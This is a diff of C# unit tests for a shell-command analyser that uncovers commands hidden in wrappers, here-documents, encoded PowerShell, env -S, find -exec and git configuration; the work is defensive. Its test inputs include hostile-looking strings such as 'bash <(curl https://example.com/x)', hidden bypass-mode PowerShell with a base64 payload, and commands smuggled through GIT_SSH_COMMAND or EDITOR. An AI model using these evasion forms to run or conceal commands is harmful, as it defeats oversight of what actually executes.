         foreach (var option in new[] { "-e", "-ec", "-en", "-enc", "-EncodedC", "/EncodedCommand" })
         {
-            Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["pwsh", option, encoded]));
+            Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["pwsh", option, encoded]));
         }
 
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["pwsh", "-com", "sudo x"]));
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["powershell", "-ExecutionPolicy", "Bypass", "sudo", "x"]));
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands((IReadOnlyList<string>)["pwsh", "-c", "iex 'sudo x'"]));
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["pwsh", "-com", "sudo x"]));
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["powershell", "-ExecutionPolicy", "Bypass", "sudo", "x"]));
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["pwsh", "-c", "iex 'sudo x'"]));
+
+        // Windows PowerShell's parameters are read by its own table, its command read once from its first word that is
+        // neither a parameter nor a parameter's value; one it does not know is refused, for it may take that word.
+        Assert.Contains(["sudo", "x"], Commands((IReadOnlyList<string>)["powershell", "-w", "Hidden", "-NoP", "-NonI", "-ep", "Bypass", "sudo", "x"]));
+        Assert.Single(Commands((IReadOnlyList<string>)["powershell", "Get-ChildItem", .. Enumerable.Repeat("a", 2000)]));
+        Assert.Contains(
+            "'-Foo' is an option of Windows PowerShell's own this does not know",
+            Assert.Throws<NotSupportedException>(() => Commands((IReadOnlyList<string>)["powershell", "-Foo", "x", "sudo", "x"])).Message,
+            StringComparison.Ordinal);
     }
 
     [Fact]
     public void ForRules_DropsGitsOwnOptionsBeforeItsSubcommand()
     {
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "-C", "x", "push"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "-Cfoo", "push"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "--git-dir=y", "push"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "--no-pager", "push"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push", "origin"]], CommandAnalysis.ForRules(["git", "-p", "push", "origin"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "push"], StringComparison.Ordinal));
-        Assert.Equal([["dotnet", "test"]], CommandAnalysis.ForRules(["dotnet", "test"], StringComparison.Ordinal));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "-C", "x", "push"]));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "-Cfoo", "push"]));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "--git-dir=y", "push"]));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "--no-pager", "push"]));
+        Assert.Equal([["git", "push", "origin"]], CommandAnalysis.ForRules(["git", "-p", "push", "origin"]));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["git", "push"]));
+        Assert.Equal([["dotnet", "test"]], CommandAnalysis.ForRules(["dotnet", "test"]));
     }
 
     [Fact]
     public void ForRules_OnceItsOptionsAreDropped_TheCommandKeepsItsArguments()
     {
-        Assert.Equal([["git", "push", "origin", "main"]], CommandAnalysis.ForRules(["git", "-C", "..", "push", "origin", "main"], StringComparison.Ordinal));
-        Assert.Equal([["git", "commit", "-m", "x"]], CommandAnalysis.ForRules(["git", "-c", "user.email=a@b", "commit", "-m", "x"], StringComparison.Ordinal));
+        Assert.Equal([["git", "push", "origin", "main"]], CommandAnalysis.ForRules(["git", "-C", "..", "push", "origin", "main"]));
+        Assert.Equal([["git", "commit", "-m", "x"]], CommandAnalysis.ForRules(["git", "-c", "user.email=a@b", "commit", "-m", "x"]));
     }
 
     [Fact]
     public void ForRules_AGitCThatNamesAnAliasOrAProgramGitRuns_IsTheGitConfigItIs()
     {
-        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "-c", "alias.x=commit", "x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "-calias.x=commit", "x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "push"], ["git", "push"]], CommandAnalysis.ForRules(["git", "-c", "core.sshCommand=ssh -i ~/.ssh/other", "push"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "status"], ["git", "status"]], CommandAnalysis.ForRules(["git", "-c", "core.hooksPath=.githooks", "status"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "--config-env=alias.x=X", "x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "--config-env", "alias.x=X", "x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "push"], ["git", "push"]], CommandAnalysis.ForRules(["git", "--exec-path=/tmp/x", "push"], StringComparison.Ordinal));
+        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "-c", "alias.x=commit", "x"]));
+        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "-calias.x=commit", "x"]));
+        Assert.Equal([["git", "config", "push"], ["git", "push"]], CommandAnalysis.ForRules(["git", "-c", "core.sshCommand=ssh -i ~/.ssh/other", "push"]));
+        Assert.Equal([["git", "config", "status"], ["git", "status"]], CommandAnalysis.ForRules(["git", "-c", "core.hooksPath=.githooks", "status"]));
+        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "--config-env=alias.x=X", "x"]));
+        Assert.Equal([["git", "config", "x"], ["git", "x"]], CommandAnalysis.ForRules(["git", "--config-env", "alias.x=X", "x"]));
+        Assert.Equal([["git", "config", "push"], ["git", "push"]], CommandAnalysis.ForRules(["git", "--exec-path=/tmp/x", "push"]));
     }
 
     [Fact]
     public void ForRules_GitConfiguredThroughTheEnvironment_IsTheGitConfigItIs()
     {
-        Assert.Equal([["git", "config", "GIT_CONFIG_COUNT", "git", "x"], ["git", "x"]], CommandAnalysis.ForRules(["GIT_CONFIG_COUNT=1", "git", "x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "config", "GIT_TEMPLATE_DIR", "export", "GIT_TEMPLATE_DIR=x"], ["export", "GIT_TEMPLATE_DIR=x"]], CommandAnalysis.ForRules(["export", "GIT_TEMPLATE_DIR=x"], StringComparison.Ordinal));
-        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["A=1", "git", "push"], StringComparison.Ordinal));
+        Assert.Equal([["git", "config", "GIT_CONFIG_COUNT", "git", "x"], ["git", "x"]], CommandAnalysis.ForRules(["GIT_CONFIG_COUNT=1", "git", "x"]));
+        Assert.Equal([["git", "config", "GIT_TEMPLATE_DIR", "export", "GIT_TEMPLATE_DIR=x"], ["export", "GIT_TEMPLATE_DIR=x"]], CommandAnalysis.ForRules(["export", "GIT_TEMPLATE_DIR=x"]));
+        Assert.Equal([["git", "push"]], CommandAnalysis.ForRules(["A=1", "git", "push"]));
     }
 
     [Fact]
     public void ForRules_LeavesANonGitCommandAlone()
     {
-        Assert.Equal([["echo", "git", "-C", "x", "push"]], CommandAnalysis.ForRules(["echo", "git", "-C", "x", "push"], StringComparison.Ordinal));
+        Assert.Equal([["echo", "git", "-C", "x", "push"]], CommandAnalysis.ForRules(["echo", "git", "-C", "x", "push"]));
     }
 
     [Fact]
@@ -324,23 +424,23 @@ public sealed class CommandAnalysisTests
     [Fact]
     public void ACommentAndAHereDocumentAreNeverCommands_TheirApostrophesNoQuotes()
     {
-        Assert.Equal([["echo", "hi"]], CommandAnalysis.Commands("echo hi # don't sudo this"));
-        Assert.Equal([["git", "status"]], CommandAnalysis.Commands("# it's a note\ngit status"));
-        Assert.Equal([["echo", "a#b"]], CommandAnalysis.Commands("echo a#b"));
+        Assert.Equal([["echo", "hi"]], Commands("echo hi # don't sudo this"));
+        Assert.Equal([["git", "status"]], Commands("# it's a note\ngit status"));
+        Assert.Equal([["echo", "a#b"]], Commands("echo a#b"));
 
         // A here-document's lines are the input it gives, never commands; the line after it is one.
-        Assert.Equal([["cat", "<<<it's sudo"], ["git", "status"]], CommandAnalysis.Commands("cat <<'EOF'\nit's sudo\nEOF\ngit status"));
-        Assert.Equal([["cat", "<<<x"]], CommandAnalysis.Commands("cat <<-EOF\n\tx\n\tEOF"));
+        Assert.Equal([["cat", "<<<it's sudo"], ["git", "status"]], Commands("cat <<'EOF'\nit's sudo\nEOF\ngit status"));
+        Assert.Equal([["cat", "<<<x"]], Commands("cat <<-EOF\n\tx\n\tEOF"));
 
         // An expanding one runs what substitutes in it; a quoted one runs nothing.
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("cat <<EOF\n$(sudo id)\nEOF"));
-        Assert.DoesNotContain(["sudo", "id"], CommandAnalysis.Commands("cat <<'EOF'\n$(sudo id)\nEOF"));
+        Assert.Contains(["sudo", "id"], Commands("cat <<EOF\n$(sudo id)\nEOF"));
+        Assert.DoesNotContain(["sudo", "id"], Commands("cat <<'EOF'\n$(sudo id)\nEOF"));
     }
 
     [Fact]
     public void ACommitMessageAHereDocumentGives_IsReadAsTheCommitItIs()
     {
-        var commands = CommandAnalysis.Commands("git commit -m \"$(cat <<'EOF'\nFix the reader's quotes\n\nIt's done.\nEOF\n)\"");
+        var commands = Commands("git commit -m \"$(cat <<'EOF'\nFix the reader's quotes\n\nIt's done.\nEOF\n)\"");
 
         Assert.Equal(2, commands.Count);
         Assert.Equal(["cat", "<<<Fix the reader's quotes\n\nIt's done."], commands[0]);
@@ -350,20 +450,214 @@ public sealed class CommandAnalysisTests
     [Fact]
     public void AHereStringAShellReads_IsItsScript_AndAShellRunningAProcessSubstitution_IsRefused()
     {
-        Assert.Contains(["git", "push"], CommandAnalysis.Commands("bash <<< 'git push'"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("sh <<EOF\nsudo id\nEOF"));
-        Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands("bash <(curl https://example.com/x)"));
+        Assert.Contains(["git", "push"], Commands("bash <<< 'git push'"));
+        Assert.Contains(["sudo", "id"], Commands("sh <<EOF\nsudo id\nEOF"));
+
+        // A file as its input is a script file, unseen as any is; one an expansion names is refused.
+        Assert.Equal([["bash", "<run.sh"]], Commands("bash < run.sh"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash < $X"));
+    }
+
+    [Fact]
+    public void AShellsInput_IsWhatTheLastRedirectOfItsDescriptorZeroGives()
+    {
+        // The last redirect of descriptor 0 is the input; one of another descriptor is none.
+        Assert.Contains(["git", "push"], Commands("bash <<<'echo hi' <<<'git push'"));
+        Assert.DoesNotContain(["echo", "hi"], Commands("bash <<<'echo hi' <<<'git push'"));
+        Assert.Contains(["git", "push"], Commands("bash 3<<<'echo hi' 0<<<'git push'"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash 3<<<'echo hi'"));
+
+        // Duplicated from another descriptor, or named by one, it is what an earlier command printed.
+        Assert.Throws<NotSupportedException>(() => Commands("bash <<<'echo hi' <&3"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash 0<&3"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash < /dev/stdin"));
+        Assert.Throws<NotSupportedException>(() => Commands("echo 'git push' | bash /dev/stdin"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash /dev/fd/3"));
+        Assert.Contains(["git", "push"], Commands("bash /dev/stdin <<<'git push'"));
+
+        // PowerShell's '-' as its command or its file is its input, as a '-' alone is.
+        Assert.Throws<NotSupportedException>(() => Commands("pwsh -Command -"));
+        Assert.Throws<NotSupportedException>(() => Commands("powershell -File -"));
+        Assert.Contains(["git", "push"], Commands("pwsh -Command - <<<'git push'"));
+        Assert.Contains(["git", "push"], Commands("pwsh -File - <<<'git push'"));
+    }
+
+    [Fact]
+    public void FindsExec_RunsItsWordsToTheirTerminator_ReadingFindsInput()
+    {
+        Assert.Contains(["git", "push"], Commands("find . -exec sh ';' <<<'git push'"));
+        Assert.Throws<NotSupportedException>(() => Commands("find . -exec sh ';'"));
+        Assert.Contains(["git", "push"], Commands("find . -execdir sh -c 'git push' ';'"));
+
+        // A '+' after a '{}' ends the words too; what follows is find's own.
+        Assert.Contains(["git", "push"], Commands("find . -exec echo {} + -exec sh ';' <<<'git push'"));
+        Assert.Throws<NotSupportedException>(() => Commands("find . -exec echo {} + -exec sh ';'"));
+    }
+
+    [Fact]
+    public void Arithmetic_IsReadAsArithmetic_ItsShiftNoHereDocument()
+    {
+        Assert.Equal([["echo", "$((1<<2))"], ["git", "push"]], Commands("echo $((1<<2))\ngit push"));
+        Assert.Equal([["git", "push"]], Commands("(( x = 1 << 3 ))\ngit push"));
+        Assert.Contains(["git", "push"], Commands("for ((i=0;i<(1<<3);i++)); do echo $i; done\ngit push"));
+        Assert.Equal([["x=$[1<<2]"], ["git", "push"]], Commands("x=$[1<<2]\ngit push"));
+
+        // Its substitutions run, read as commands; one that does not close as arithmetic is a substitution of a subshell.
+        Assert.Equal([["id"], ["echo", "$(($(id)+1))"]], Commands("echo $(($(id)+1))"));
+        Assert.Contains(["a"], Commands("echo $((a) )"));
+        Assert.Single(Commands("echo $(( echo $(id) ) )"), command => command.SequenceEqual(["id"]));
+
+        // A line end inside it reads the documents pending before it - and its fall-back reads them again, as the substitution's.
+        var pending = Commands("cat <<EOF; echo $(( echo $(true\nEOF\n) ) )");
+        Assert.Contains(["cat", "<<<"], pending);
+        Assert.Contains(["true"], pending);
+
+        // A quote's parenthesis closes nothing, as the shell finds the close: this is a subshell, not arithmetic.
+        Assert.Contains(["git", "push"], Commands("((echo '(' ; git push) ))"));
+
+        // Its text is read as a double quote's: a single quote's substitution runs.
+        Assert.Contains(["git", "push"], Commands("echo $(( '$(git push)' ))"));
+        Assert.Contains(["id"], Commands("echo $[ '`id`' ]"));
+
+        // One that never closes, nested, is read once at each place - in time, never in time doubling with each.
+        Assert.Contains(["echo", "$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[$[x"], Commands("echo " + string.Concat(Enumerable.Repeat("$[", 31)) + "x"));
+
+        // Nested past the bound, it is refused, never a crash.
+        var deep = "echo " + string.Concat(Enumerable.Repeat("$((", 20000)) + "1" + string.Concat(Enumerable.Repeat("))", 20000));
+        Assert.Contains("nest past 32 levels", Assert.Throws<NotSupportedException>(() => Commands(deep)).Message, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public void ACommandAnotherProgramRunsWithWordsItFillsIn_IsOneOfItsOwn()
+    {
+        Assert.Contains(["./build.cmd", "$(xargs)"], Commands("find . -exec ./build.cmd {} ';'"));
+        Assert.Contains(["mv", "$(xargs)", "$(xargs)"], Commands("find . -exec mv {} {}.bak ';'"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("fd -e txt -x build.cmd"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("fd -x build.cmd {/} ';' -E x"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("rg --pre build.cmd pattern"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("rg --pre=build.cmd pattern"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("parallel build.cmd :::: list"));
+        Assert.Contains(["build.cmd", "$(xargs)"], Commands("parallel build.cmd {1} ::: a b"));
+
+        // parallel joins its command's words and runs them through the shell, each word it fills in quoted.
+        Assert.Contains(["git", "push", "$(xargs)"], Commands("parallel 'git push' ::: origin"));
+        Assert.Contains(["gzip", "$(xargs)"], Commands("parallel 'gzip {}' ::: a b"));
+        Assert.Equal([["parallel", "gzip {}", ":::", "a", "b"], ["gzip", "$(xargs)"]], Commands("parallel 'gzip {}' ::: a b"));
+
+        // A script it fills in - a file's name in sh -c's place - is one this does not read; xargs's replace string so too.
+        Assert.Contains("fills in", Assert.Throws<NotSupportedException>(() => Commands("find . -exec sh -c 'echo {}' ';'")).Message, StringComparison.Ordinal);
+        Assert.Throws<NotSupportedException>(() => Commands("ls | xargs -I{} sh -c 'echo {}'"));
+
+        // A shell's word it fills in is data its script reads; a program it fills in is one this does not read.
+        Assert.Contains(["wc", "-l", "$1"], Commands("find . -exec sh -c 'wc -l \"$1\"' _ {} ';'"));
+        Assert.Throws<NotSupportedException>(() => Commands("find . -name '*.sh' -exec {} ';'"));
+    }
+
+    [Fact]
+    public void ASingleQuoteInADoubleQuotesBraces_IsACharacter_ItsSubstitutionRun()
+    {
+        Assert.Contains(["git", "push"], Commands("echo \"${UNSET:-'$(git push)'}\""));
+        Assert.Contains(["git", "push"], Commands("cat <<EOF\n${UNSET:-'$(git push)'}\nEOF"));
+        Assert.DoesNotContain(["git", "push"], Commands("echo ${UNSET:-'$(git push)'}"));
+
+        // A substitution is a script of its own, whatever quote it stands in.
+        Assert.DoesNotContain(["git", "push"], Commands("echo \"$(echo ${UNSET:-'$(git push)'})\""));
+    }
+
+    [Fact]
+    public void AShellsOptions_AreReadAsItReadsThem_BeforeItsScript()
+    {
+        // An o in a short cluster takes the next word, as -o does.
+        Assert.Contains(["git", "push", "origin", "main"], Commands("bash -eo pipefail -c 'git push origin main'"));
+        Assert.Contains(["git", "push"], Commands("bash -euo pipefail -c 'git push'"));
+
+        // A help or a version runs nothing where it is the program's option - before its script - and is a word after.
+        Assert.Equal([["bash", "--help", "-c", "git push"]], Commands("bash --help -c 'git push'"));
+        Assert.Contains(["git", "push"], Commands("bash -c 'git push' --help"));
+        Assert.Contains(["git", "push"], Commands((IReadOnlyList<string>)["cmd", "/c", "git push & echo", "/?"]));
+        Assert.Contains(["git", "push"], Commands("powershell -Version 2 -Command 'git push'"));
+        Assert.Contains(["git", "push", "origin", "main"], Commands("watch 'git push origin main; true' --help"));
+        Assert.Equal([["pwsh", "-Help"]], Commands("pwsh -Help"));
+        Assert.Equal([["cmd", "/?", "/c", "git push"]], Commands((IReadOnlyList<string>)["cmd", "/?", "/c", "git push"]));
+        Assert.Equal([["watch", "--help", "git push"]], Commands("watch --help 'git push'"));
+        Assert.Equal([["script", "-c", "git push", "--help"]], Commands("script -c 'git push' --help"));
+
+        // Windows PowerShell's -Version names the engine by its value, and with no command it reads its input.
+        Assert.Throws<NotSupportedException>(() => Commands("powershell -Version 2"));
+    }
+
+    [Fact]
+    public void ARedirectsDescriptor_IsReadAsBashReadsIt()
+    {
+        // A {name} before the operator is a descriptor bash gives the redirect, never a word.
+        Assert.Equal([new ShellRedirect(int.MaxValue, ">", "/dev/null")], Assert.Single(CommandAnalysis.Commands("echo {v}>/dev/null")).Redirects);
+        Assert.Throws<NotSupportedException>(() => Commands("echo 'git push' | bash {v}>/dev/null"));
+
+        // A descriptor moved onto the input is one duplicated onto it.
+        Assert.Throws<NotSupportedException>(() => Commands("sh 3<<<'git push' <&3-"));
+
+        // Digits past an int's reach are a word.
+        Assert.Equal([["cp", "a", "99999999999", ">/dev/null"]], Commands("cp a 99999999999>/dev/null"));
+    }
+
+    [Fact]
+    public void AScriptFileThatIsTheInput_IsReadSo_HoweverItsPathIsSpelled()
+    {
+        foreach (var command in new[] { "bash /dev//stdin", "bash /dev/./stdin", "bash //dev/stdin", "bash /dev/../dev/stdin", "bash /proc/self/fd//0", "cd /dev && bash stdin", "bash fd/3" })
+        {
+            Assert.Throws<NotSupportedException>(() => Commands("printf x | " + command));
+        }
+
+        Assert.Contains(["git", "push"], Commands("bash /dev//stdin <<<'git push'"));
+    }
+
+    [Fact]
+    public void AnEsacTheReaderReadsAsAWord_ClosesItsCase()
+    {
+        Assert.Equal([["echo", "hi"], ["git", "push"]], Commands("case x in a) echo hi; esac\\\n\ngit push"));
+        Assert.Equal([["echo", "hi"]], Commands("case x in a) echo hi; esac\\\n"));
+        Assert.Equal([["echo", "hi"], ["git", "push"]], Commands("case x in a) echo hi;; es\\\nac\ngit push"));
+    }
+
+    [Fact]
+    public void AnAlias_IsACommandThisDoesNotRead()
+    {
+        Assert.Throws<NotSupportedException>(() => Commands("shopt -s expand_aliases\nalias gp='git push'\ngp origin main"));
+        Assert.Throws<NotSupportedException>(() => Commands("Set-Alias gp git"));
+        Assert.Equal([["alias"], ["alias", "ll"]], Commands("alias; alias ll"));
+    }
+
+    [Fact]
+    public void EnvSplitsItsString_ByItsOwnRules_NotTheShells()
+    {
+        // A separator is a character like any to env, a quote's text stands as it is, a '#' beginning a word ends it.
+        Assert.Equal([["git", "push;", "x"]], Commands("env -S 'git push; x'"));
+        Assert.Equal([["git", "push", "a b"]], Commands("env -S 'git push \"a b\"'"));
+        Assert.Equal([["git", "push"]], Commands("env -S 'git push #x'"));
+        Assert.Equal([["git", "push"]], Commands("env -v -S 'git push'"));
+        Assert.Equal([["git", "push"]], Commands("env -C dir -S 'git push'"));
+        Assert.Equal([["git", "push"]], Commands("env -iS 'git push'"));
+        Assert.Equal([["git", "push"]], Commands("env -u X -S'git push'"));
+        Assert.Contains(["git", "push;"], Commands("find . -exec env -S 'git push;' ';'"));
+        Assert.DoesNotContain(["git", "push"], Commands("find . -exec env -S 'git push;' ';'"));
+
+        // A backslash's escapes are env's own, and a comment a line end follows is one this does not read.
+        Assert.Throws<NotSupportedException>(() => Commands("env -S 'git push\\c x'"));
+        Assert.Throws<NotSupportedException>(() => Commands("env -S 'git\\_push'"));
+        Assert.Throws<NotSupportedException>(() => Commands("env -S \"git #x\ngit push\""));
+        Assert.Throws<NotSupportedException>(() => Commands("env -S 'git \"push'"));
+        Assert.Throws<NotSupportedException>(() => Commands("bash <(curl https://example.com/x)"));
 
         // A process substitution's body runs before the command, which reads the file it names.
-        Assert.Equal([["sort", "a"], ["diff", "<(sort a)", "b"]], CommandAnalysis.Commands("diff <(sort a) b"));
+        Assert.Equal([["sort", "a"], ["diff", "<(sort a)", "b"]], Commands("diff <(sort a) b"));
     }
 
     [Fact]
     public void XargsRunsItsCommandWithItsInputAsAnExpansion()
     {
-        Assert.Equal([["echo", "x"], ["git", "push", "$(xargs)"]], CommandAnalysis.Commands("echo x | xargs git push"));
-        Assert.Equal([["echo", "x"], ["git", "push", "$(xargs)"]], CommandAnalysis.Commands("echo x | xargs -I{} git push {}"));
-        Assert.Equal([["echo", "x"], ["echo", "$(xargs)"]], CommandAnalysis.Commands("echo x | xargs"));
+        Assert.Equal([["echo", "x"], ["git", "push", "$(xargs)"]], Commands("echo x | xargs git push"));
+        Assert.Equal([["echo", "x"], ["git", "push", "$(xargs)"]], Commands("echo x | xargs -I{} git push {}"));
+        Assert.Equal([["echo", "x"], ["echo", "$(xargs)"]], Commands("echo x | xargs"));
     }
 
     [Fact]
@@ -371,61 +665,61 @@ public sealed class CommandAnalysisTests
     {
         foreach (var shell in new[] { "sh", "dash", "ksh", "mksh", "ash", "yash", "fish", "csh", "tcsh", "busybox sh" })
         {
-            Assert.Contains(["sudo", "id"], CommandAnalysis.Commands($"{shell} -c 'sudo id'"));
+            Assert.Contains(["sudo", "id"], Commands($"{shell} -c 'sudo id'"));
         }
 
         var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("sudo x"));
 
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands($"pwsh -w hidden -enc {encoded}"));
-        Assert.Contains(["sudo", "x"], CommandAnalysis.Commands($"powershell -NoP -NonI -W Hidden -Exec Bypass -enc {encoded}"));
+        Assert.Contains(["sudo", "x"], Commands($"pwsh -w hidden -enc {encoded}"));
+        Assert.Contains(["sudo", "x"], Commands($"powershell -NoP -NonI -W Hidden -Exec Bypass -enc {encoded}"));
     }
 
     [Fact]
     public void WrappersPastTheBound_AreRefused_NeverReadForever()
     {
-        Assert.Equal([["git", "push"]], CommandAnalysis.Commands("nohup nohup env nice git push"));
-        Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands(string.Join(' ', Enumerable.Repeat("nohup", 100)) + " git push"));
+        Assert.Equal([["git", "push"]], Commands("nohup nohup env nice git push"));
+        Assert.Throws<NotSupportedException>(() => Commands(string.Join(' ', Enumerable.Repeat("nohup", 100)) + " git push"));
     }
 
     [Fact]
     public void TheCommandLinesTrapWatchScriptAndFlockRun_AreGoneInto()
     {
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("trap 'sudo id' EXIT"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("watch -n 5 'sudo id'"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("script -q -c 'sudo id' /dev/null"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("flock /tmp/l -c 'sudo id'"));
-        Assert.Equal([["trap", "-p"]], CommandAnalysis.Commands("trap -p"));
+        Assert.Contains(["sudo", "id"], Commands("trap 'sudo id' EXIT"));
+        Assert.Contains(["sudo", "id"], Commands("watch -n 5 'sudo id'"));
+        Assert.Contains(["sudo", "id"], Commands("script -q -c 'sudo id' /dev/null"));
+        Assert.Contains(["sudo", "id"], Commands("flock /tmp/l -c 'sudo id'"));
+        Assert.Equal([["trap", "-p"]], Commands("trap -p"));
     }
 
     [Fact]
     public void AProgramValuedVariable_IsReadAsTheCommandLineItRuns()
     {
         // Each runs in the environment of the command that names it.
-        Assert.Contains(["GIT_SSH_COMMAND=git push", "git", "push"], CommandAnalysis.Commands("GIT_SSH_COMMAND='git push' git fetch"));
-        Assert.Contains(["EDITOR=sudo id", "sudo", "id"], CommandAnalysis.Commands("env EDITOR='sudo id' git commit"));
-        Assert.Contains(["GIT_PAGER=cat", "cat"], CommandAnalysis.Commands("GIT_PAGER=cat git log"));
-        Assert.Contains(CommandAnalysis.Commands("export GIT_PAGER='sudo id'"), command => command.Skip(CommandAnalysis.EnvironmentOf(command)).SequenceEqual(["sudo", "id"]));
+        Assert.Contains(["GIT_SSH_COMMAND=git push", "git", "push"], Commands("GIT_SSH_COMMAND='git push' git fetch"));
+        Assert.Contains(["EDITOR=sudo id", "sudo", "id"], Commands("env EDITOR='sudo id' git commit"));
+        Assert.Contains(["GIT_PAGER=cat", "cat"], Commands("GIT_PAGER=cat git log"));
+        Assert.Contains(Commands("export GIT_PAGER='sudo id'"), command => command.Skip(CommandAnalysis.EnvironmentOf(command)).SequenceEqual(["sudo", "id"]));
     }
 
     [Fact]
     public void TheShellsOwnGrammar_IsReadAsTheShellReadsIt()
     {
         // A function's body runs as the commands it holds; an array's words run nothing.
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("f() { sudo id; }; f"));
-        Assert.Contains(["sudo", "id"], CommandAnalysis.Commands("function f { sudo id; }"));
-        Assert.Equal([["A=(sudo id)"]], CommandAnalysis.Commands("A=(sudo id)"));
-        Assert.Equal([["declare", "-a", "A=(x y)"]], CommandAnalysis.Commands("declare -a A=(x y)"));
+        Assert.Contains(["sudo", "id"], Commands("f() { sudo id; }; f"));
+        Assert.Contains(["sudo", "id"], Commands("function f { sudo id; }"));
+        Assert.Equal([["A=(sudo id)"]], Commands("A=(sudo id)"));
+        Assert.Equal([["declare", "-a", "A=(x y)"]], Commands("declare -a A=(x y)"));
 
         // Inside [[ ]] a parenthesis, '&&', '||' and '<' are words of the test; past its ']]' they are the shell's.
-        Assert.Equal([["[[", "(", "-f", "x", "&&", "-d", "y", ")", "]]"], ["z"]], CommandAnalysis.Commands("[[ ( -f x && -d y ) ]] && z"));
-        Assert.Equal([["[[", "a", "<", "b", "||", "$x", "=~", "^", "(", "c", "|", "d", ")", "$", "]]"]], CommandAnalysis.Commands("[[ a < b || $x =~ ^(c|d)$ ]]"));
+        Assert.Equal([["[[", "(", "-f", "x", "&&", "-d", "y", ")", "]]"], ["z"]], Commands("[[ ( -f x && -d y ) ]] && z"));
+        Assert.Equal([["[[", "a", "<", "b", "||", "$x", "=~", "^", "(", "c", "|", "d", ")", "$", "]]"]], Commands("[[ a < b || $x =~ ^(c|d)$ ]]"));
 
         // A reserved word quoted is a word.
-        Assert.Equal([["echo", "if", "then"]], CommandAnalysis.Commands("echo if then"));
-        Assert.Equal([["if"]], CommandAnalysis.Commands("'if'"));
+        Assert.Equal([["echo", "if", "then"]], Commands("echo if then"));
+        Assert.Equal([["if"]], Commands("'if'"));
 
         // A word where none can stand is refused, never read forever.
-        Assert.Throws<NotSupportedException>(() => CommandAnalysis.Commands("for x in a >b; do y; done"));
+        Assert.Throws<NotSupportedException>(() => Commands("for x in a >b; do y; done"));
     }
 
     [Fact]
@@ -467,8 +761,9 @@ public sealed class CommandAnalysisTests
         Assert.Equal(["ftp://files.example/x"], CommandAnalysis.WebAddresses(["curl", "ftp://files.example/x"]));
         Assert.Equal([], CommandAnalysis.WebAddresses(["curl", "file:///etc/hosts"]));
 
-        // A redirect's file is no host, nor is wget's output file.
-        Assert.Equal(["https://a.example/"], CommandAnalysis.WebAddresses(["curl", "https://a.example/", ">page.html"]));
+        // A redirect's file is no host, nor is wget's output file - and a word spelled as a redirect is the word curl reads.
+        Assert.Equal(["https://a.example/"], CommandAnalysis.WebAddresses(CommandAnalysis.Commands("curl https://a.example/ >page.html")[0].Words));
+        Assert.Equal(["https://a.example/"], CommandAnalysis.WebAddresses(CommandAnalysis.Commands("curl -o '>x' https://a.example/")[0].Words));
         Assert.Equal(["a.example/x"], CommandAnalysis.WebAddresses(["wget", "-O", "page.html", "a.example/x"]));
     }
 
@@ -500,4 +795,12 @@ public sealed class CommandAnalysisTests
         Assert.Equal([], CommandAnalysis.WebAddresses(["dotnet", "restore"]));
